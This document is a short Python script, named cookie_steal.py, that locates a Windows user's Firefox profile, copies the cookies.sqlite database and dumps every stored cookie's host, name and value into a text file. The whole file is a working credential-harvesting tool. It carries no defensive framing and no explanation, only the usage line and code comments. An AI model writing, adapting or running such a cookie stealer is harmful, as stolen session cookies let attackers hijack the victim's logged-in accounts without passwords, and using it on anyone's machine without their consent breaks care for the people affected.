# For Windows
# Firefox Only

'''
Usage: python3 cookie_steal.py
'''

import os
import shutil
import sqlite3 

# Get a folder whose complete name you don't know
def get_folder(path, incomplete_name):
    if os.path.exists(path):
        dirs = os.listdir(path)
        for dir in dirs:
            if incomplete_name.lower() in dir.lower():
                return dir
        print(f"Folder similar to {incomplete_name} doesn't exist.\n\n")
        exit()


# for firefox
path_to_copy_to = os.getcwd()
user = os.getlogin()
cookie_file='cookies.sqlite'

PATH = os.path.join('C:/Users', user, "AppData/Roaming/Mozilla/Firefox/Profiles")

if os.path.exists(PATH):
    # cookies are stored in a directory named <random_hex>-default-release
    folder = get_folder(PATH, 'default-release')
    PATH = os.path.join(PATH, folder)
    
    # Full path to cookie file
    full_cookie_file = os.path.join(PATH, cookie_file)
else:
    print("Firefox not at default path.")
    exit()

try:
    # copy the cookie file
    shutil.copy(full_cookie_file, path_to_copy_to)
except:
    print(f'Couldnot copy {cookie_file} to {path_to_copy_to}')
    exit(-1)

# Read the SQLite DB
conn = sqlite3.connect(cookie_file)
c = conn.cursor()
c.execute('SELECT * FROM moz_cookies')
table = c.fetchall()
c.close()
conn.close()

os.remove(cookie_file)

with open('cookies.txt', 'w') as f:
    for row in table:
        f.write(f'HOST:{row[4]}:COOKIE:{row[2]}={row[3]}\n')

